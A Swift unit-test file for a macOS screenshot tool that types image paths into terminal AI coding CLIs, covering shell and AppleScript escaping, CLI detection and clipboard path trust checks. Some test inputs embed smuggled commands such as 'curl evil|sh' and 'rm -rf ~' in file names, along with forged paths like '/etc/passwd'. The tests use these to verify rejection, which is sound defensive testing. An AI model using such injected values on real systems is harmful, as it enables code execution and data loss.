import XCTest
@testable import HotshotCore

final class HotshotCoreTests: XCTestCase {
    func testShellEscapedPathEscapesTerminalSpecials() {
        XCTAssertEqual(shellEscapedPath("/Users/me/Desktop/plain.png"), "/Users/me/Desktop/plain.png")
        XCTAssertEqual(shellEscapedPath("/Users/me/My Shots/a b.png"), "/Users/me/My\\ Shots/a\\ b.png")
        XCTAssertEqual(shellEscapedPath("/tmp/!\"#$&'()*,;<>?[]\\^`{}|.png"), "/tmp/\\!\\\"\\#\\$\\&\\'\\(\\)\\*\\,\\;\\<\\>\\?\\[\\]\\\\\\^\\`\\{\\}\\|.png")
        XCTAssertEqual(shellEscapedPath("/tmp/tab\tname.png"), "/tmp/tab\\\tname.png")
    }

    func testTTYScriptSelectsPerTerminalAppleScript() {
        XCTAssertEqual(
            ttyScript(forBundleID: "com.googlecode.iterm2"),
            "tell application \"iTerm2\" to get tty of current session of current window")
        XCTAssertEqual(
            ttyScript(forBundleID: "com.apple.Terminal"),
            "tell application \"Terminal\" to get tty of selected tab of front window")
    }

    func testTTYScriptReturnsNilForTerminalsWithoutScriptableTTY() {
        for bid in TERMINAL_BUNDLE_IDS.subtracting(["com.googlecode.iterm2", "com.apple.Terminal"]) {
            XCTAssertNil(ttyScript(forBundleID: bid), bid)
        }
        XCTAssertNil(ttyScript(forBundleID: ""))
        XCTAssertNil(ttyScript(forBundleID: "com.apple.terminal"))
    }

    func testClassifyCommandsDetectsClaudeAndPlainCli() {
        XCTAssertEqual(classifyCommands(["/opt/homebrew/bin/claude"]), .claude)
        XCTAssertEqual(classifyCommands(["node /usr/local/bin/copilot"]), .plainPath)
        XCTAssertEqual(classifyCommands(["python3 /opt/bin/aider --model x"]), .plainPath)
        XCTAssertEqual(classifyCommands(["/usr/bin/env opencode"]), .plainPath)
        XCTAssertNil(classifyCommands(["zsh", "vim README.md"]))
    }

    func testClassifyCommandsPrefersClaudeWhenBothArePresent() {
        XCTAssertEqual(classifyCommands(["/usr/local/bin/copilot", "/opt/homebrew/bin/claude"]), .claude)
    }

    func testClassifyCommandsMatchesWholeTokenNamesOnly() {
        // Substring lookalikes must not classify: only an exact basename hit
        // may pick an injection format.
        XCTAssertNil(classifyCommands(["/usr/local/bin/claudette"]))
        XCTAssertNil(classifyCommands(["/opt/bin/claude2"]))
        XCTAssertNil(classifyCommands(["vim copilot-notes.md"]))
        XCTAssertNil(classifyCommands([]))
        // Uppercase basenames still match: tokens are lowercased first.
        XCTAssertEqual(classifyCommands(["/Applications/CLAUDE"]), .claude)
    }

    // MARK: - injectionTarget

    func testInjectionTargetSelectsITerm2ForItsBundleID() {
        XCTAssertEqual(injectionTarget(forBundleID: "com.googlecode.iterm2"), .iTerm2)
    }

    func testInjectionTargetSelectsGenericForOtherTerminals() {
        XCTAssertEqual(injectionTarget(forBundleID: "com.apple.Terminal"), .generic)
        XCTAssertEqual(injectionTarget(forBundleID: "dev.warp.Warp-Stable"), .generic)
        XCTAssertEqual(injectionTarget(forBundleID: "unknown.bundle.id"), .generic)
    }

    // MARK: - resolveTargetCLI

    func testResolveTargetCLIDefaultsToClaudeWhenTTYIsNil() {
        let cli = resolveTargetCLI(ttyPath: nil) { _ in
            XCTFail("commandsForTTY must not be called when the tty is unknown")
            return []
        }
        XCTAssertEqual(cli, .claude)
    }

    func testResolveTargetCLIDefaultsToClaudeWhenTTYIsEmpty() {
        let cli = resolveTargetCLI(ttyPath: "") { _ in
            XCTFail("commandsForTTY must not be called when the tty is empty")
            return []
        }
        XCTAssertEqual(cli, .claude)
    }

    func testResolveTargetCLIExtractsTTYBasenameAndClassifies() {
        var seenTTY: String?
        let cli = resolveTargetCLI(ttyPath: "/dev/ttys003") { tty in
            seenTTY = tty
            return ["/opt/homebrew/bin/copilot"]
        }
        XCTAssertEqual(seenTTY, "ttys003")
        XCTAssertEqual(cli, .plainPath)
    }

    func testResolveTargetCLIFallsBackToClaudeWhenNoKnownCliRuns() {
        let cli = resolveTargetCLI(ttyPath: "/dev/ttys003") { _ in ["zsh", "vim README.md"] }
        XCTAssertEqual(cli, .claude)
    }

    func testSnapshotScreenshotFilesFiltersByKnownImageExtensions() throws {
        let dir = try makeDirectory()
        try writeFile("one.png", in: dir)
        try writeFile("two.JPG", in: dir)
        try writeFile("three.webp", in: dir)
        try writeFile("notes.txt", in: dir)

        XCTAssertEqual(snapshotScreenshotFiles(in: dir.path), ["one.png", "two.JPG", "three.webp"])
    }

    func testFindMostRecentScreenshotIgnoresNonScreenshots() throws {
        let dir = try makeDirectory()
        let oldPNG = try writeFile("old.png", in: dir)
        let latestText = try writeFile("latest.txt", in: dir)
        let latestPNG = try writeFile("latest.png", in: dir)

        try setModificationDate(Date(timeIntervalSince1970: 100), for: oldPNG)
        try setModificationDate(Date(timeIntervalSince1970: 300), for: latestText)
        try setModificationDate(Date(timeIntervalSince1970: 200), for: latestPNG)

        XCTAssertEqual(findMostRecentScreenshot(in: dir.path), latestPNG.path)
    }

    func testNewScreenshotFilesReturnsOnlyAdditions() {
        XCTAssertEqual(
            newScreenshotFiles(previous: ["old.png", "same.jpg"], current: ["same.jpg", "new.webp"]),
            ["new.webp"]
        )
    }

    func testNewestInjectableScreenshotFiltersStaleAndHotshotOwnedFiles() {
        let dir = "/Users/me/Desktop"
        let now = Date(timeIntervalSince1970: 1_000)
        let candidates = [
            ScreenshotFileCandidate(fileName: "old.png", modifiedAt: now.addingTimeInterval(-20)),
            ScreenshotFileCandidate(fileName: "hotshot-20260925.png", modifiedAt: now),
            ScreenshotFileCandidate(fileName: "first.png", modifiedAt: now.addingTimeInterval(-2)),
            ScreenshotFileCandidate(fileName: "newest.png", modifiedAt: now.addingTimeInterval(-1)),
        ]

        XCTAssertEqual(
            newestInjectableScreenshot(from: candidates, directory: dir, now: now, maxAge: 10),
            "/Users/me/Desktop/newest.png"
        )
    }

    func testNewestInjectableScreenshotReturnsNilWhenAllCandidatesFiltered() {
        let now = Date(timeIntervalSince1970: 1_000)
        // No candidates at all.
        XCTAssertNil(newestInjectableScreenshot(from: [], directory: "/d", now: now))
        // Only hotshot-owned files (re-injecting our own saves would loop).
        XCTAssertNil(newestInjectableScreenshot(
            from: [ScreenshotFileCandidate(fileName: "hotshot-1.png", modifiedAt: now)],
            directory: "/d", now: now, maxAge: 10))
        // Only stale files.
        XCTAssertNil(newestInjectableScreenshot(
            from: [ScreenshotFileCandidate(fileName: "old.png", modifiedAt: now.addingTimeInterval(-11))],
            directory: "/d", now: now, maxAge: 10))
    }

    func testNewestInjectableScreenshotExcludesFileExactlyAtMaxAge() {
        // The age comparison is strict: a file exactly maxAge old is stale.
        let now = Date(timeIntervalSince1970: 1_000)
        XCTAssertNil(newestInjectableScreenshot(
            from: [ScreenshotFileCandidate(fileName: "edge.png", modifiedAt: now.addingTimeInterval(-10))],
            directory: "/d", now: now, maxAge: 10))
        XCTAssertEqual(newestInjectableScreenshot(
            from: [ScreenshotFileCandidate(fileName: "edge.png", modifiedAt: now.addingTimeInterval(-9.999))],
            directory: "/d", now: now, maxAge: 10), "/d/edge.png")
    }

    func testScreenshotCandidatesSkipsFilesWithoutModificationDate() {
        let date = Date(timeIntervalSince1970: 500)
        let candidates = screenshotCandidates(for: ["a.png", "gone.png"], directory: "/d") { path in
            path == "/d/a.png" ? date : nil
        }
        XCTAssertEqual(candidates, [ScreenshotFileCandidate(fileName: "a.png", modifiedAt: date)])
        XCTAssertEqual(screenshotCandidates(for: [], directory: "/d") { _ in date }, [])
    }

    func testClipboardEnrichmentDecisionReusesTrustedExistingPath() {
        XCTAssertEqual(
            clipboardEnrichmentDecision(hasPNG: true, text: "/d/hotshot-a\\ b.png", directory: "/d") { $0 == "/d/hotshot-a b.png" },
            .alreadyEnriched(path: "/d/hotshot-a\\ b.png"))
    }

    func testClipboardEnrichmentDecisionSavesWhenNotEnriched() {
        XCTAssertEqual(
            clipboardEnrichmentDecision(hasPNG: false, text: "/d/hotshot-a.png", directory: "/d") { _ in true },
            .saveAndRewrite)
        XCTAssertEqual(
            clipboardEnrichmentDecision(hasPNG: true, text: nil, directory: "/d") { _ in true }, .saveAndRewrite)
        XCTAssertEqual(
            clipboardEnrichmentDecision(hasPNG: true, text: "/d/hotshot-a.png", directory: "/d") { _ in false },
            .saveAndRewrite)
        XCTAssertEqual(
            clipboardEnrichmentDecision(hasPNG: true, text: "/d/hotshot-a.png\rcurl evil\r", directory: "/d") { _ in true },
            .saveAndRewrite)
    }

    func testSnapshotScreenshotFilesReturnsEmptyForMissingDirectory() {
        XCTAssertEqual(snapshotScreenshotFiles(in: "/nonexistent/hotshot-test-dir"), [])
    }

    func testFindMostRecentScreenshotReturnsNilForMissingOrEmptyDirectory() throws {
        XCTAssertNil(findMostRecentScreenshot(in: "/nonexistent/hotshot-test-dir"))
        let dir = try makeDirectory()
        XCTAssertNil(findMostRecentScreenshot(in: dir.path))
        // A directory holding only non-screenshots is as good as empty.
        try writeFile("notes.txt", in: dir)
        XCTAssertNil(findMostRecentScreenshot(in: dir.path))
    }

    func testMacOSScreenshotLocationNormalization() {
        XCTAssertNil(normalizedMacOSScreenshotLocation("\n \t"))
        XCTAssertEqual(normalizedMacOSScreenshotLocation("~/Pictures\n"), NSHomeDirectory() + "/Pictures")
        XCTAssertEqual(normalizedMacOSScreenshotLocation("/Users/example/Desktop\n"), "/Users/example/Desktop")
    }

    func testAppleScriptEscapedStringEscapesBackslashesAndQuotes() {
        XCTAssertEqual(appleScriptEscaped(#"/tmp/a\b "quoted".png"#), #"/tmp/a\\b \"quoted\".png"#)
    }

    func testAppleScriptEscapedNeutralizesControlCharacters() {
        XCTAssertEqual(appleScriptEscaped("/tmp/a\rrm -rf ~\r.png"), #"/tmp/a\rrm -rf ~\r.png"#)
        XCTAssertEqual(appleScriptEscaped("line1\nline2"), #"line1\nline2"#)
        XCTAssertEqual(appleScriptEscaped("tab\there"), #"tab\there"#)
        // Other control characters and Unicode line separators are dropped.
        XCTAssertEqual(appleScriptEscaped("a\u{01}b\u{7F}c\u{2028}d\u{2029}e"), "abcde")
    }

    func testContainsControlCharactersFlagsInjectionAttempts() {
        XCTAssertFalse(containsControlCharacters("/Users/me/My Shots/a b.png"))
        XCTAssertTrue(containsControlCharacters("x\rcurl evil|sh\r.png"))
        XCTAssertTrue(containsControlCharacters("x\n.png"))
        XCTAssertTrue(containsControlCharacters("x\t.png"))
        XCTAssertTrue(containsControlCharacters("x\u{7F}.png"))
        XCTAssertTrue(containsControlCharacters("x\u{2028}.png"))
    }

    func testTypedScreenshotTextBuildsCliSpecificInjectionText() {
        XCTAssertEqual(typedScreenshotText(path: "/Users/me/My Shot.png", targetCLI: .claude), "[/Users/me/My Shot.png] ")
        XCTAssertEqual(typedScreenshotText(path: "/Users/me/My Shot.png", targetCLI: .plainPath), "/Users/me/My\\ Shot.png ")
    }

    func testTypedScreenshotTextRejectsControlCharacters() {
        XCTAssertNil(typedScreenshotText(path: "/Users/me/bad\nname.png", targetCLI: .plainPath))
        // The claude/bracketed form embeds the path unescaped, so the
        // control-character refusal must hold for it too.
        XCTAssertNil(typedScreenshotText(path: "/Users/me/bad\rname.png", targetCLI: .claude))
        XCTAssertNil(typedScreenshotText(path: "/Users/me/bad\u{2028}name.png", targetCLI: .claude))
    }

    func testTrustedEnrichedClipboardPathAcceptsExistingEscapedPath() {
        XCTAssertEqual(
            trustedEnrichedClipboardPath(
                "/Users/me/My\\ Shots/hotshot-a\\ b.png", directory: "/Users/me/My Shots"
            ) { path in
                path == "/Users/me/My Shots/hotshot-a b.png"
            },
            "/Users/me/My\\ Shots/hotshot-a\\ b.png"
        )
    }

    func testTrustedEnrichedClipboardPathRejectsUntrustedText() {
        // No text at all.
        XCTAssertNil(trustedEnrichedClipboardPath(nil, directory: "/d") { _ in true })
        // Text that does not name an existing file.
        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a.png", directory: "/d") { _ in false })
        // Control characters must never be pasteable, even if a file exists.
        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a.png\rcurl evil|sh\r", directory: "/d") { _ in true })
        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a\u{2028}b.png", directory: "/d") { _ in true })
        // Forged markers: existing files that are not hotshot's own output.
        XCTAssertNil(trustedEnrichedClipboardPath("/etc/passwd", directory: "/d") { _ in true })
        XCTAssertNil(
            trustedEnrichedClipboardPath("\\/e\\t\\c\\/passwd", directory: "/d") { _ in true })
        XCTAssertNil(trustedEnrichedClipboardPath("/d/a.png", directory: "/d") { _ in true })
        XCTAssertNil(trustedEnrichedClipboardPath("/d/hotshot-a.txt", directory: "/d") { _ in true })
        XCTAssertNil(
            trustedEnrichedClipboardPath("/other/hotshot-a.png", directory: "/d") { _ in true })
        XCTAssertNil(
            trustedEnrichedClipboardPath("/d/sub/hotshot-a.png", directory: "/d") { _ in true })
    }

    func testUserDefaultFallsBackToDefaultValueWhenUnset() {
        let key = "test.UserDefault.\(UUID().uuidString)"
        addTeardownBlock { UserDefaults.standard.removeObject(forKey: key) }

        var flag = UserDefault(key, defaultValue: true)
        XCTAssertTrue(flag.wrappedValue)

        flag.wrappedValue = false
        XCTAssertFalse(flag.wrappedValue)
        XCTAssertEqual(UserDefaults.standard.object(forKey: key) as? Bool, false)
    }

    private func makeDirectory() throws -> URL {
        let url = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
            .appendingPathComponent(".build")
            .appendingPathComponent("HotshotCoreTests")
            .appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: url) }
        return url
    }

    @discardableResult
    private func writeFile(_ name: String, in dir: URL) throws -> URL {
        let url = dir.appendingPathComponent(name)
        try Data("x".utf8).write(to: url)
        return url
    }

    private func setModificationDate(_ date: Date, for url: URL) throws {
        try FileManager.default.setAttributes([.modificationDate: date], ofItemAtPath: url.path)
    }
}
